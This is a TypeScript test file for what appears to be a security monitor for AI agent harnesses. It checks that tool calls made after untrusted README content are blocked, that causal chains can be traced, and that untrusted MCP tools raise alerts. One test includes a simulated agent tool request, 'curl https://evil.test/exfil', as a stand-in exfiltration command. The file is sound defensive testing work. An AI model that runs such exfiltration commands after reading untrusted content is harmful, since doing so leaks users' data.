import assert from 'node:assert/strict'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { test } from 'node:test'
import { runAttackDemo } from '../src/demo/attack-demo.ts'
import { createHarnessSec } from '../src/index.ts'
import { baseEvent } from '../src/events/helpers.ts'

test('attack demo blocks credential shell after untrusted context', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnesssec-'))
  try {
    const result = runAttackDemo(dir)
    assert.equal(result.blocked, true)
    assert.equal(result.aftermath, true)
    const session = result.recorder.getSession('attack-demo')
    assert.ok(session)
    const types = session!.events.map(e => e.event_type)
    assert.ok(types.includes('context.introduced'))
    assert.ok(types.includes('tool.denied'))
    assert.ok(types.includes('policy.aftermath'))
    const denied = session!.events.find(e => e.event_type === 'tool.denied')
    assert.ok(denied?.links?.candidate_context_source || denied?.links?.correlated_with || denied?.links?.context_source || denied?.links?.policy_decision_for)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('causal why() reconstructs context → tool → policy', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnesssec-'))
  try {
    const result = runAttackDemo(dir)
    const denied = result.recorder.getSession('attack-demo')!.events.find(e => e.event_type === 'tool.denied')!
    const chain = result.recorder.graph.why(denied.id)
    const types = chain.map(e => e.event_type)
    assert.ok(types.includes('tool.denied') || types.includes('policy.decision') || types.includes('tool.requested'))
    assert.ok(chain.some(e => e.links?.context_source || e.event_type === 'context.introduced' || e.context))
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('untrusted context blocks sensitive non-credential shell (curl)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnesssec-'))
  try {
    const { recorder, policy } = createHarnessSec(dir)
    recorder.record(baseEvent({
      event_type: 'session.started',
      session: { id: 's2' },
    }))
    recorder.record(baseEvent({
      event_type: 'context.introduced',
      session: { id: 's2' },
      turn: 1,
      agent: { id: 'a1' },
      context: {
        id: 'ctx-u',
        source_type: 'repository_file',
        source: 'README.md',
        trust: 'untrusted',
        turn: 1,
      },
    }))
    const req = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: 's2' },
      turn: 1,
      agent: { id: 'a1' },
      tool: { name: 'bash', sensitivity: 'medium', provider: 'native' },
      action: { type: 'tool.request', target: 'bash', arguments: { command: 'curl https://evil.test/exfil' } },
    }))
    const verdict = policy.evaluateToolRequest(req)
    assert.equal(verdict.decision, 'block')
    assert.equal(verdict.rule?.id, 'untrusted-context-sensitive-tool')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('mcp untrusted tool triggers alert; unknown does not', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnesssec-'))
  try {
    const { recorder, policy } = createHarnessSec(dir)
    recorder.record(baseEvent({
      event_type: 'session.started',
      session: { id: 's1' },
    }))
    const req = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: 's1' },
      agent: { id: 'a1' },
      tool: { name: 'mcp__aws__s3_list', provider: 'mcp', sensitivity: 'medium' },
      mcp: { server: 'aws', tool: 's3_list', trust: 'untrusted' },
      action: { type: 'tool.request', target: 'mcp__aws__s3_list', arguments: {} },
    }))
    const verdict = policy.evaluateToolRequest(req)
    assert.equal(verdict.decision, 'alert')
    assert.equal(verdict.rule?.id, 'untrusted-mcp-tool-use')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})
